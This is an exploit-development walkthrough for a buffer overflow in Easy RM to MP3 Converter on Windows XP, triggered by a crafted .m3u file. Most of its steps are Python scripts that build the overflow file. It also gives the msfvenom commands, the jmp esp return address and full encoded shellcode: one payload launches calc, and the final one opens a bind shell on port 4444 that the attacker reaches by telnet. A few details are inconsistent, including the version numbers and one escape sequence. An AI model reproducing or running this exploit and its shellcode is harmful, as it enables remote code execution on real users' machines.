Exploit for:
Easy RM to MP3 27.3.700

Vulnerability:
You can create a malicious .m3u file, feed it to the utility and trigger the buffer overflow exploit.

Discovered by:
Crazy_Hacker

Written by:
Jean Gonzalez
https://github.com/Jean13

Works in: Windows XP SP2 and Windows XP SP3.

07/31/2016

Exploit Steps:

1) Download and install Easy RM to MP3 Converter version 2.7.3.700 on a machine running Windows XP.

2) Download and install Immunity Debugger on the same machine.

3) On your Linux machine:
cat > EasyRMExpoit_step1.py
file = "crash.m3u"
junk = "\x41" * 30000
creation = open(file, 'w')
creation.write(junk)
creation.close()
print("m3u File Created successfully\n")

4) On your Linux machine:
python EasyRMExploit_step1.py
service apache2 start
cp crash.m3u /var/www/html

5) Download the m3u on your Windows machine.

6) Run the EasyRM software, open Immunity Debugger, attach the EasyRM process and run it. 

7) Open the m3u file with EasyRM. You should notice it crashes the program. In Immunity Debugger you should see in the 'Registers' section that EIP points at 41414141, which is hexadecimal for AAAA. The malicious file caused a buffer overflow.

8) On your Linux machine:
cat > EasyRMExpoit_step2.py
file = "crash2.m3u"
junk1 = "\x41" * 25000
junk2 = "\x42" * 5000
junkyard = junk1 + junk2
creation = open(file, 'w')
creation.write(junkyard)
creation.close()
print("m3u File Created Successfully\n")

9) On your Linux machine:
python EasyRMExpoit_step2.py
cp crash2.m3u /var/www/html

10) Download the file on your Windows machine.

11) In Immunity Debugger, click on Debug -> Restart, and run the process again.

12) Open the m3u file with EasyRM. In Immunity Debugger you should see in the 'Registers' section that EIP points at 42424242, which is hexadecimal for BBBB. This means that EIP has an offset between 25000 and 30000.

13) To find the exact location in your buffer that overwrites EIP, in your Linux machine:
cd /usr/share/metasploit-framework/tools/exploit/
./pattern_create.rb -l 5000

14) Copy the output into a text file. 

15) In your Linux machine:
cat > EasyRMExploit_step3.py
file = "crash3.m3u"
junk1 = "\x41" * 25000
junk2 = "Paste the contents of the text file/the output here"
junkyard = junk1 + junk2
creation = open(file, 'w')
creation.write(junkyard)
creation.close()
print("m3u File Created Successfully\n")

16) Repeat steps #9 through #11.

17) Open the m3u file with EasyRM. In Immunity Debugger, notice in the 'Registers' section what EIP points at. In my case it is: 326A4231

18) In your Linux machine:
./pattern_offset.rb -q 0x326A4231 -l 5000

19) Notice the output of step #18. In my case it was 1055. In your Linux machine:
cat > EasyRMExploit_step4.py
file = "crash4.m3u"
junk = "\x41" * 26055
eip = "\x42\x42\x42\x42"
esp_data = "\x43" * 1000
junkyard = junk + eip + esp_data
creation = open(file, 'w')
creation.write(junkyard)
creation.close()
print("m3u File Created Successfully\n")

20) Repeat steps #9 through #11.

21) Open the m3u file with EasyRM. In Immunity Debugger you should see in the 'Registers' section that EIP points at 42424242. If you take a look at ESP, it points at a bunch of C's. We now control EIP. 

22) In your Linux machine:
cat > EasyRMExploit_step5.py
file = "crash5.m3u"
junk = "\x41" * 26055
eip = "x42" * 4
shellcode = ("1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" 
+ "5ABCDEFGHIJK6ABCDEFGHIJK" 
+ "7ABCDEFGHIJK8ABCDEFGHIJK" 
+ "9ABCDEFGHIJKAABCDEFGHIJK" 
+ "BABCDEFGHIJKCABCDEFGHIJK")

junk_shell = junk + eip + shellcode

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

24) Repeat steps #9 through #11.

25) Open the m3u file with EasyRM. 

26) Dump memory at location ESP by typing in Immunity Debugger: d esp
You should see that ESP starts at the first character of our pattern. 
After our pattern, we also see a bunch of A's. These A's belong to the first part
of our buffer (the 26051 A's), so we can also put our shellcode in the first part
of the buffer, before overwriting RET. 
We now have control over EIP and a register that directly points to our code
(at address 0x000FFD38 in my case). 

27) In Immunity Debugger, click on Debug -> Restart.

28) In Immunity Debugger, type: !mona assemble -s "jmp esp"
Take note of the output opcode. In my case it was: \xff\xe4

28) In Immunity Debugger, type: !mona jmp -r esp

29) Open the log file at C:\logs\RM2MP3Converter
You need to find the lines that indicate dll's that belong to Easy RM. Using
dll's that belong to the OS can provide unreliable exploits.
Also important is to find addresses that do not contain null bytes.
Let's look at the MSRMCcodec02.dll, it's loaded between 018f0000 and 01dbd000.

30) In Immunity Debugger, type: !mona find -s "\xff\xe4" -b 018f0000 -t 01dbd000

31) In Immunity Debugger, verify that the first address works by:
Right-click on the address -> Copy to clipboard -> Address
Type: !mona info -a 01AE023F
Excellent. It works, so we can use this address to overwrite EIP and execute 
jmp esp. Esp contains our shellcode, so we now have a working exploit.

32) For the purpose of testing it works, in your Linux machine:
Read: https://docs.python.org/3.0/library/struct.html

cat > EasyRMExploit_step6.py
import struct

file = "crash6.m3u"
junk = "\x41" * 26055

# Packs the address in little-endian.
# jmp esp from MSRMCcodec02.dll
eip = struct.pack('<I', 0x01AE023F)

shellcode = "\x90" * 25

# This will cause the application to break, simulating shellcode, but
# allowing you to further debug.
shellcode += "\xcc"

shellcode += "\x90" * 25

junk_shell = junk + eip + shellcode

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

33) Repeat steps #9 through #11.

34) Open the m3u file with EasyRM. 

35) In Immunity Debugger, type: d esp
Notice that the jmp esp worked. We can now put in malicious shellcode to exploit the application.

36) In Immunity Debugger: Options -> Just-in-time-debugging -> Restore old just-in-time debugger -> Confirm before attaching -> Done.

37) In your Linux machine:
msfvenom -p windows/exec CMD=calc EXITFUNC=seh -b '\x00\x09\x0a' -e x86/shikata_ga_nai -f python

38) Copy the output.

39) cat > EasyRMExploit_step7.py
import struct

file = "crash7.m3u"
junk = "\x41" * 26055

# Packs the address in little-endian.
# jmp esp from MSRMCcodec02.dll
eip = struct.pack('<I', 0x01B1B22A)

nops = "\x90" * 25

# The payload
buf = "\xbf\x16\xb7\xef\x38\xdb\xca\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x30\x31\x7b\x13\x83\xeb\xfc\x03\x7b\x19\x55"
buf += "\x1a\xc4\xcd\x1b\xe5\x35\x0d\x7c\x6f\xd0\x3c\xbc\x0b"
buf += "\x90\x6e\x0c\x5f\xf4\x82\xe7\x0d\xed\x11\x85\x99\x02"
buf += "\x92\x20\xfc\x2d\x23\x18\x3c\x2f\xa7\x63\x11\x8f\x96"
buf += "\xab\x64\xce\xdf\xd6\x85\x82\x88\x9d\x38\x33\xbd\xe8"
buf += "\x80\xb8\x8d\xfd\x80\x5d\x45\xff\xa1\xf3\xde\xa6\x61"
buf += "\xf5\x33\xd3\x2b\xed\x50\xde\xe2\x86\xa2\x94\xf4\x4e"
buf += "\xfb\x55\x5a\xaf\x34\xa4\xa2\xf7\xf2\x57\xd1\x01\x01"
buf += "\xe5\xe2\xd5\x78\x31\x66\xce\xda\xb2\xd0\x2a\xdb\x17"
buf += "\x86\xb9\xd7\xdc\xcc\xe6\xfb\xe3\x01\x9d\x07\x6f\xa4"
buf += "\x72\x8e\x2b\x83\x56\xcb\xe8\xaa\xcf\xb1\x5f\xd2\x10"
buf += "\x1a\x3f\x76\x5a\xb6\x54\x0b\x01\xdc\xab\x99\x3f\x92"
buf += "\xac\xa1\x3f\x82\xc4\x90\xb4\x4d\x92\x2c\x1f\x2a\x62"
buf += "\xdc\x92\xa6\xf3\x47\x47\x8b\x99\x77\xbd\xcf\xa7\xfb"
buf += "\x34\xaf\x53\xe3\x3c\xaa\x18\xa3\xad\xc6\x31\x46\xd2"
buf += "\x75\x31\x43\xb1\x18\xa1\x0f\x36"

junk_shell = junk + eip + nops + buf

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

40) Repeat steps #9 through #10.

41) Open the m3u file with EasyRM. 
The application crashes and opens the Calculator. Excellent! The exploit works.

42) In your Linux machine:
msfvenom -p windows/shell_bind_tcp EXITFUNC=seh LPORT=4444 -b '\x00\x09\x0a\x0d' --smallest -f python

43) Copy the output.

44) In your Linux machine:
cat > EasyRMExploit_step8.py
import struct

file = "crash8.m3u"
junk = "\x41" * 26055

# Packs the address in little-endian.
# jmp esp from MSRMCcodec02.dll
eip = struct.pack('<I', 0x01B1B22A)

nops = "\x90" * 25

# Encoder: x86/fnstenv_mov
# Payload size: 350 bytes
# Payload: windows/shell_bind_tcp
buf = "\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\xfe\x95\x6e\xc4\x83\xeb\xfc\xe2\xf4\x02\x7d\xec\xc4"
buf += "\xfe\x95\x0e\x4d\x1b\xa4\xae\xa0\x75\xc5\x5e\x4f\xac"
buf += "\x99\xe5\x96\xea\x1e\x1c\xec\xf1\x22\x24\xe2\xcf\x6a"
buf += "\xc2\xf8\x9f\xe9\x6c\xe8\xde\x54\xa1\xc9\xff\x52\x8c"
buf += "\x36\xac\xc2\xe5\x96\xee\x1e\x24\xf8\x75\xd9\x7f\xbc"
buf += "\x1d\xdd\x6f\x15\xaf\x1e\x37\xe4\xff\x46\xe5\x8d\xe6"
buf += "\x76\x54\x8d\x75\xa1\xe5\xc5\x28\xa4\x91\x68\x3f\x5a"
buf += "\x63\xc5\x39\xad\x8e\xb1\x08\x96\x13\x3c\xc5\xe8\x4a"
buf += "\xb1\x1a\xcd\xe5\x9c\xda\x94\xbd\xa2\x75\x99\x25\x4f"
buf += "\xa6\x89\x6f\x17\x75\x91\xe5\xc5\x2e\x1c\x2a\xe0\xda"
buf += "\xce\x35\xa5\xa7\xcf\x3f\x3b\x1e\xca\x31\x9e\x75\x87"
buf += "\x85\x49\xa3\xfd\x5d\xf6\xfe\x95\x06\xb3\x8d\xa7\x31"
buf += "\x90\x96\xd9\x19\xe2\xf9\x6a\xbb\x7c\x6e\x94\x6e\xc4"
buf += "\xd7\x51\x3a\x94\x96\xbc\xee\xaf\xfe\x6a\xbb\xae\xf6"
buf += "\xcc\x3e\x26\x03\xd5\x3e\x84\xae\xfd\x84\xcb\x21\x75"
buf += "\x91\x11\x69\xfd\x6c\xc4\xef\xc9\xe7\x22\x94\x85\x38"
buf += "\x93\x96\x57\xb5\xf3\x99\x6a\xbb\x93\x96\x22\x87\xfc"
buf += "\x01\x6a\xbb\x93\x96\xe1\x82\xff\x1f\x6a\xbb\x93\x69"
buf += "\xfd\x1b\xaa\xb3\xf4\x91\x11\x96\xf6\x03\xa0\xfe\x1c"
buf += "\x8d\x93\xa9\xc2\x5f\x32\x94\x87\x37\x92\x1c\x68\x08"
buf += "\x03\xba\xb1\x52\xc5\xff\x18\x2a\xe0\xee\x53\x6e\x80"
buf += "\xaa\xc5\x38\x92\xa8\xd3\x38\x8a\xa8\xc3\x3d\x92\x96"
buf += "\xec\xa2\xfb\x78\x6a\xbb\x4d\x1e\xdb\x38\x82\x01\xa5"
buf += "\x06\xcc\x79\x88\x0e\x3b\x2b\x2e\x90\xca\xcc\x7f\x06"
buf += "\x62\x6b\x28\xf3\x3b\x2b\xa9\x68\xb8\xf4\x15\x95\x24"
buf += "\x8b\x90\xd5\x83\xed\xe7\x01\xae\xfe\xc6\x91\x11"

junk_shell = junk + eip + nops + buf

creation = open(file, 'w')
creation.write(junk_shell)
creation.close()

print("m3u File Created Successfully\n")

43) Repeat steps #9 through #10.

44) Open the m3u file with EasyRM. 
The application freezes. Do not close it. 

45) In your Linux machine:
telnet 192.168.1.22 4444

Congratulations! You just built your first working exploit.

